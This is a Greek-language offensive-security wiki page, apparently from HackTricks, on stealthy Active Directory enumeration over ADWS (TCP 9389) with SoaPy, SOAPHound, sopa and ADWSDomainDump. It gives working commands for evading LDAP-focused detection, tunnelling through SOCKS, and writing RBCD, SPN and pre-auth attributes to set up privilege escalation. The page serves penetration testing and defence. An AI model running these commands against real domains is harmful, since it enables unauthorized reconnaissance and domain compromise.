# Active Directory Web Services (ADWS) Enumeration & Stealth Collection

{{#include ../../banners/hacktricks-training.md}}

## Τι είναι το ADWS;

Το Active Directory Web Services (ADWS) είναι **ενεργοποιημένο από προεπιλογή σε κάθε Domain Controller από το Windows Server 2008 R2** και ακούει στη θύρα TCP **9389**. Παρά την ονομασία του, **δεν χρησιμοποιείται HTTP**. Αντίθετα, η υπηρεσία εκθέτει δεδομένα τύπου LDAP μέσω μιας στοίβας ιδιόκτητων .NET framing protocols:<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

Επειδή η κίνηση ενθυλακώνεται μέσα σε αυτά τα binary SOAP frames και μεταδίδεται μέσω μιας ασυνήθιστης θύρας, η **enumeration μέσω ADWS είναι πολύ λιγότερο πιθανό να ελεγχθεί, φιλτραριστεί ή αναγνωριστεί από signatures σε σχέση με την κλασική κίνηση LDAP/389 & 636**. Για τους operators αυτό σημαίνει:<sup>[[1]](#references)[[7]](#references)</sup>

* Πιο stealthy recon – Οι Blue teams συχνά επικεντρώνονται σε LDAP queries.
* Ελευθερία συλλογής από **non-Windows hosts (Linux, macOS)** μέσω tunnelling της 9389/TCP μέσω SOCKS proxy.
* Τα ίδια δεδομένα που θα αποκτούσατε μέσω LDAP (users, groups, ACLs, schema κ.λπ.) και η δυνατότητα εκτέλεσης **writes** (π.χ. `msDs-AllowedToActOnBehalfOfOtherIdentity` για **RBCD**).

Οι αλληλεπιδράσεις με το ADWS υλοποιούνται μέσω WS-Enumeration: κάθε query ξεκινά με ένα μήνυμα `Enumerate` που ορίζει το LDAP filter/attributes και επιστρέφει ένα `EnumerationContext` GUID, ακολουθούμενο από ένα ή περισσότερα μηνύματα `Pull` που μεταφέρουν έως το result window που έχει οριστεί από τον server.<sup>[[7]](#references)</sup> Τα contexts λήγουν μετά από περίπου 30 λεπτά, επομένως τα εργαλεία πρέπει είτε να κάνουν page τα results είτε να χωρίζουν τα filters (prefix queries ανά CN) για να αποφεύγουν την απώλεια state.<sup>[[8]](#references)</sup> Όταν ζητάτε security descriptors, καθορίστε το `LDAP_SERVER_SD_FLAGS_OID` control ώστε να παραλείπονται τα SACLs· διαφορετικά, το ADWS απλώς αφαιρεί το attribute `nTSecurityDescriptor` από το SOAP response.

> ΣΗΜΕΙΩΣΗ: Το ADWS χρησιμοποιείται επίσης από πολλά RSAT GUI/PowerShell tools, επομένως η κίνηση μπορεί να αναμειχθεί με νόμιμη admin activity.

## SoaPy – Native Python Client

Το [SoaPy](https://github.com/logangoins/soapy) είναι μια **πλήρης re-implementation του ADWS protocol stack σε pure Python**. Δημιουργεί τα NBFX/NBFSE/NNS/NMF frames byte-for-byte, επιτρέποντας τη συλλογή από Unix-like systems χωρίς να αγγίζει το .NET runtime.<sup>[[1]](#references)[[2]](#references)</sup>

### Βασικά Features

* Υποστηρίζει **proxying μέσω SOCKS** (χρήσιμο από C2 implants).
* Fine-grained search filters πανομοιότυπα με το LDAP `-q '(objectClass=user)'`.
* Προαιρετικές **write** operations (`--set` / `--delete`).
* **BOFHound output mode** για άμεση ingestion στο BloodHound.
* Το flag `--parse` μορφοποιεί timestamps / `userAccountControl` για καλύτερη human readability όταν απαιτείται.<sup>[[2]](#references)</sup>

### Targeted collection flags & write operations

Το SoaPy διαθέτει curated switches που αναπαράγουν τις πιο συνηθισμένες LDAP hunting tasks μέσω ADWS: `--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds`, καθώς και raw `--query` / `--filter` knobs για custom pulls. Συνδυάστε τα με write primitives όπως `--rbcd <source>` (ορίζει το `msDs-AllowedToActOnBehalfOfOtherIdentity`), `--spn <service/cn>` (SPN staging για targeted Kerberoasting) και `--asrep` (αλλάζει το `DONT_REQ_PREAUTH` στο `userAccountControl`).<sup>[[2]](#references)</sup>

Παράδειγμα targeted SPN hunt που επιστρέφει μόνο τα `samAccountName` και `servicePrincipalName`:
```bash
soapy corp.local/alice:'Winter2025!'@dc01.corp.local \
--spns -f samAccountName,servicePrincipalName --parse
```
Χρησιμοποιήστε τον ίδιο host/credentials για να weaponise άμεσα τα findings: κάντε dump των αντικειμένων που υποστηρίζουν RBCD με `--rbcds` και, στη συνέχεια, εφαρμόστε `--rbcd 'WEBSRV01$' --account 'FILE01$'` για να προετοιμάσετε μια αλυσίδα Resource-Based Constrained Delegation (δείτε το [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) για την πλήρη διαδρομή abuse).

### Εγκατάσταση (operator host)
```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```
## ADWSDomainDump – LDAPDomainDump μέσω ADWS (Linux/Windows)

* Fork του `ldapdomaindump` που αντικαθιστά τα LDAP queries με κλήσεις ADWS μέσω TCP/9389, για τη μείωση των LDAP-signature hits.
* Εκτελεί αρχικό reachability check στη θύρα 9389, εκτός αν δοθεί το `--force` (παρακάμπτει το probe όταν τα port scans προκαλούν θόρυβο ή φιλτράρονται).
* Έχει δοκιμαστεί έναντι των Microsoft Defender for Endpoint και CrowdStrike Falcon με επιτυχημένο bypass, όπως αναφέρεται στο README.<sup>[[4]](#references)</sup>

### Εγκατάσταση
```bash
pipx install .
```
### Χρήση
```bash
adwsdomaindump -u 'thewoods.local\mathijs.verschuuren' -p 'password' -n 10.10.10.1 dc01.thewoods.local
```
Η τυπική έξοδος καταγράφει τον έλεγχο προσβασιμότητας στη θύρα 9389, το ADWS bind και την έναρξη/ολοκλήρωση του dump:
```text
[*] Connecting to ADWS host...
[+] ADWS port 9389 is reachable
[*] Binding to ADWS host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```
## Sopa - Ένας πρακτικός client για ADWS σε Golang

Όπως και το soapy, το [sopa](https://github.com/Macmod/sopa) υλοποιεί το protocol stack του ADWS (MS-NNS + MC-NMF + SOAP) σε Golang, εκθέτοντας command-line flags για την εκτέλεση κλήσεων ADWS όπως:<sup>[[5]](#references)</sup>

* **Αναζήτηση και ανάκτηση Object** - `query` / `get`
* **Κύκλος ζωής Object** - `create [user|computer|group|ou|container|custom]` και `delete`
* **Επεξεργασία Attribute** - `attr [add|replace|delete]`
* **Διαχείριση Account** - `set-password` / `change-password`
* και άλλα, όπως `groups`, `members`, `optfeature`, `info [version|domain|forest|dcs]`, κ.λπ.

### Σημαντικά σημεία του Protocol mapping

* Οι αναζητήσεις τύπου LDAP εκτελούνται μέσω **WS-Enumeration** (`Enumerate` + `Pull`) με attribute projection, έλεγχο scope (Base/OneLevel/Subtree) και pagination.
* Η ανάκτηση ενός μεμονωμένου Object χρησιμοποιεί **WS-Transfer** `Get`, οι αλλαγές Attribute χρησιμοποιούν `Put`, ενώ οι διαγραφές χρησιμοποιούν `Delete`.
* Η ενσωματωμένη δημιουργία Object χρησιμοποιεί **WS-Transfer ResourceFactory**· τα custom Object χρησιμοποιούν ένα **IMDA AddRequest** που βασίζεται σε YAML templates.
* Οι λειτουργίες password είναι actions του **MS-ADCAP** (`SetPassword`, `ChangePassword`).<sup>[[5]](#references)</sup>

### Ανακάλυψη metadata χωρίς authentication (mex)

Το ADWS εκθέτει το WS-MetadataExchange χωρίς credentials, προσφέροντας έναν γρήγορο τρόπο επικύρωσης της έκθεσης πριν από το authentication:<sup>[[5]](#references)</sup>
```bash
sopa mex --dc <DC>
```
### Σημειώσεις ανακάλυψης DNS/DC και στόχευσης Kerberos

Το Sopa μπορεί να εντοπίζει DC μέσω SRV, αν παραλειφθεί το `--dc` και παρέχεται το `--domain`. Εκτελεί ερωτήματα με αυτήν τη σειρά και χρησιμοποιεί τον στόχο με την υψηλότερη προτεραιότητα:<sup>[[5]](#references)</sup>
```text
_ldap._tcp.<domain>
_kerberos._tcp.<domain>
```
Σε επιχειρησιακό επίπεδο, προτιμήστε έναν resolver που ελέγχεται από το DC, ώστε να αποφεύγονται αποτυχίες σε segmented environments:

* Χρησιμοποιήστε `--dns <DC-IP>`, ώστε όλα τα SRV/PTR/forward lookups να πραγματοποιούνται μέσω του DC DNS.
* Χρησιμοποιήστε `--dns-tcp` όταν το UDP είναι αποκλεισμένο ή οι απαντήσεις SRV είναι μεγάλες.
* Αν το Kerberos είναι ενεργοποιημένο και το `--dc` είναι IP, το sopa εκτελεί **reverse PTR** για να λάβει ένα FQDN, ώστε να στοχεύσει σωστά το SPN/KDC. Αν δεν χρησιμοποιείται Kerberos, δεν πραγματοποιείται αναζήτηση PTR.

Παράδειγμα (IP + Kerberos, forced DNS μέσω του DC):
```bash
sopa info version --dc 192.168.1.10 --dns 192.168.1.10 -k --domain corp.local -u user -p pass
```
### Επιλογές υλικού auth

Εκτός από κωδικούς πρόσβασης σε **plaintext**, το sopa υποστηρίζει **NT hashes**, **Kerberos AES keys**, **ccache** και **PKINIT certificates** (PFX ή PEM) για ADWS auth. Το Kerberos υπονοείται κατά τη χρήση των `--aes-key`, `-c` (ccache) ή των επιλογών που βασίζονται σε certificates.<sup>[[5]](#references)</sup>
```bash
# NT hash
sopa --dc <DC> -d <DOMAIN> -u <USER> -H <NT_HASH> query --filter '(objectClass=user)'

# Kerberos ccache
sopa --dc <DC> -d <DOMAIN> -u <USER> -c <CCACHE> info domain
```
### Δημιουργία custom αντικειμένων μέσω templates

Για αυθαίρετες κλάσεις αντικειμένων, η εντολή `create custom` χρησιμοποιεί ένα YAML template που αντιστοιχίζει σε ένα IMDA `AddRequest`:<sup>[[5]](#references)</sup>

* Τα `parentDN` και `rdn` ορίζουν το container και το relative DN.
* Το `attributes[].name` υποστηρίζει `cn` ή namespaced `addata:cn`.
* Το `attributes[].type` δέχεται `string|int|bool|base64|hex` ή explicit `xsd:*`.
* **Μην** συμπεριλάβετε τα `ad:relativeDistinguishedName` ή `ad:container-hierarchy-parent`; το sopa τα εισάγει αυτόματα.
* Οι τιμές `hex` μετατρέπονται σε `xsd:base64Binary`. Χρησιμοποιήστε `value: ""` για να ορίσετε κενές συμβολοσειρές.

## SOAPHound – Συλλογή ADWS Μεγάλου Όγκου (Windows)

Το [FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound) είναι ένας .NET collector που διατηρεί όλες τις LDAP αλληλεπιδράσεις μέσα στο ADWS και παράγει JSON συμβατό με το BloodHound v4. Δημιουργεί μία πλήρη cache των `objectSid`, `objectGUID`, `distinguishedName` και `objectClass` μία φορά (`--buildcache`) και στη συνέχεια την επαναχρησιμοποιεί για περάσματα `--bhdump`, `--certdump` (ADCS) ή `--dnsdump` (AD-integrated DNS) μεγάλου όγκου, ώστε μόνο περίπου 35 κρίσιμα attributes να εξέρχονται από τον DC. Το AutoSplit (`--autosplit --threshold <N>`) κατατμηματοποιεί αυτόματα τα queries βάσει προθέματος CN, ώστε να παραμένουν κάτω από το timeout των 30 λεπτών του EnumerationContext σε μεγάλα forests.<sup>[[8]](#references)</sup>

Τυπικό workflow σε ένα domain-joined operator VM:
```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump \
--autosplit --threshold 1200 --nolaps \
-o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```
Εξήγαγε JSON slots απευθείας σε workflows των SharpHound/BloodHound — δείτε το [BloodHound methodology](bloodhound.md) για ιδέες σχετικά με το downstream graphing. Το AutoSplit κάνει το SOAPHound ανθεκτικό σε forests με εκατομμύρια objects, διατηρώντας παράλληλα χαμηλότερο query count από τα snapshots τύπου ADExplorer.

## Stealth AD Collection Workflow

Το παρακάτω workflow δείχνει πώς να κάνετε enumerate **domain & ADCS objects** μέσω ADWS, να τα μετατρέψετε σε BloodHound JSON και να αναζητήσετε attack paths βασισμένα σε certificates — όλα από Linux:

1. **Κάντε tunnel τη θύρα 9389/TCP** από το target network προς το box σας (π.χ. μέσω Chisel, Meterpreter, SSH dynamic port-forward κ.λπ.).  Κάντε `export HTTPS_PROXY=socks5://127.0.0.1:1080` ή χρησιμοποιήστε τα `--proxyHost/--proxyPort` του SoaPy.

2. **Συλλέξτε το root domain object:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-q '(objectClass=domain)' \
| tee data/domain.log
```
3. **Συλλογή αντικειμένων που σχετίζονται με το ADCS από το Configuration NC:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-dn 'CN=Configuration,DC=ludus,DC=domain' \
-q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
| tee data/adcs.log
```
4. **Μετατροπή σε BloodHound:**
```bash
bofhound -i data --zip   # produces BloodHound.zip
```
5. **Ανεβάστε το ZIP** στο BloodHound GUI και εκτελέστε cypher queries όπως `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c` για να αποκαλύψετε διαδρομές κλιμάκωσης πιστοποιητικών (ESC1, ESC8 κ.λπ.).

### Εγγραφή του `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD)
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
--set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```
Συνδυάστε το με `s4u2proxy`/`Rubeus /getticket` για μια πλήρη αλυσίδα **Resource-Based Constrained Delegation** (δείτε [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)).

## Σύνοψη εργαλείων

| Σκοπός | Εργαλείο | Σημειώσεις |
|---------|------|-------|
| ADWS enumeration | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, read/write |
| ADWS dump μεγάλου όγκου | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET, cache-first, λειτουργίες BH/ADCS/DNS |
| BloodHound ingest | [BOFHound](https://github.com/bohops/BOFHound) | Μετατρέπει logs από SoaPy/ldapsearch |
| Cert compromise | [Certipy](https://github.com/ly4k/Certipy) | Μπορεί να γίνει proxied μέσω του ίδιου SOCKS |
| ADWS enumeration και αλλαγές αντικειμένων | [sopa](https://github.com/Macmod/sopa) | Generic client για διασύνδεση με γνωστά ADWS endpoints - επιτρέπει enumeration, δημιουργία αντικειμένων, τροποποιήσεις attributes και αλλαγές κωδικών πρόσβασης |

## Αναφορές

- [1] [SpecterOps – Make Sure to Use SOAP(y) – Οδηγός operators για stealthy AD Collection με χρήση ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
- [2] [SoaPy στο GitHub](https://github.com/logangoins/soapy)
- [3] [BOFHound στο GitHub](https://github.com/bohops/BOFHound)
- [4] [ADWSDomainDump στο GitHub](https://github.com/mverschu/adwsdomaindump)
- [5] [Sopa στο GitHub](https://github.com/Macmod/sopa)
- [6] [Microsoft – προδιαγραφές MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
- [7] [IBM X-Force Red – Stealthy Enumeration περιβαλλόντων Active Directory μέσω ADWS](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
- [8] [FalconForce – εργαλείο SOAPHound για συλλογή δεδομένων Active Directory μέσω ADWS](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)

{{#include ../../banners/hacktricks-training.md}}
